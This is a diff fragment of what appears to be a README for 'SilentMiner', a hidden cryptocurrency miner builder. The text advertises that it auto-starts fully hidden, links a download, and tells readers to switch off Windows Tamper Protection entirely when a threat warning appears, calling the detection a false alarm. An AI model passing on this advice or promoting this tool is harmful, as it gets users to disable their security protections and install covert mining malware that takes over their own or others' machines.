@@ -9,6 +9,6 @@ it auto start fully hidden, no cmd pop ups, also uses smart threads control: whe
 
 download here: https://github.com/iiPolo/SilentMiner/releases/tag/v1
 
-if theat appears when downloading go to Windows Search > Tamper Protection > Turn Everything Off.
+if threat appears when downloading go to Windows Search > Tamper Protection > Turn Everything Off.
 its because the builder downloads Python packages if you dont have them, so windows detect it as suspicious.
 feel free to use the builder in virtual machine to test out the miner too.
